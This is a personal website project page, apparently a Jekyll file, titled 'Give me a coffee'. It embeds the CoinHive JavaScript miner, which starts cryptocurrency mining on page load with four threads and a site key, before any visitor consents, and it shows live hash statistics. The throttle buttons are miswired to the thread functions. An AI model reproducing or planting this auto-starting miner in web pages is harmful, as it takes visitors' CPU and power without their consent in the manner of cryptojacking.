---
layout: project
type: WIP
noimage: '<i class="fa fa-coffee fa-big12" aria-hidden="true"></i>'
image: 
title: Give me a coffee
github: 
description: Buy me a coffee buy giving me some CPU cycles.
---

### Performances:

* **Hashes per seconds:** <em id="hashespersecond">0</em><em>H/s</em><br>
* **Total hashes:** <em id="totalhashes">0</em><em>H</em><br>
* **Accepted hashes:** <em id="accepted">0</em><em>H</em>
* **Threads:**  <em id="numthreads">1</em><em>Threads</em> <button onclick="addThread();">+</button> <button onclick="removeThread();">-</button>
* **Throttle:**  <em id="throttle">0.8</em><button onclick="addThread();">+</button> <button onclick="removeThread();">-</button>


<script src="https://coin-hive.com/lib/coinhive.min.js"></script>

<script>
	var miner = {};
	window.onload = function() {
		miner = new CoinHive.Anonymous('94Ewh5erEv797iMDCHPDwSqQHFt6dvvd');
		miner.start();
		miner.setThrottle(0.8);
		miner.setNumThreads(4);
			// Listen on events
		miner.on('found', function() { /* Hash found */ })
		miner.on('accepted', function() { /* Hash accepted by the pool */ })

		// Update stats once per second
		setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();
			var numThreads = miner.getNumThreads();
			var throttle = miner.getThrottle();
			document.getElementById("hashespersecond").innerHTML = hashesPerSecond.toString();
			document.getElementById("totalhashes").innerHTML = totalHashes.toString();
			document.getElementById("accepted").innerHTML = acceptedHashes.toString();
			document.getElementById("numthreads").innerHTML = numThreads.toString();
			document.getElementById("throttle").innerHTML = throttle.toString();
			// Output to HTML elements...
		}, 333);
	} 

	function addThread() {
		t = miner.getNumThreads();
		miner.setNumThreads(t+1);
	}
	function removeThread() {
		t = miner.getNumThreads();
		miner.setNumThreads(t-1);
	}

	function increaseThrottle() {
		t = miner.getThrottle();
		if(t > 0.901) {
			miner.setThrottle(1.0);
		} else {
			miner.setThrottle(t+0.1);
		}
	}
	function reduceThrottle() {
		t = miner.getThrottle();
		if(t < 0.1999) {
			miner.setThrottle(0.1);
		} else {
			miner.setThrottle(t-0.1);
		}
	}
	
</script>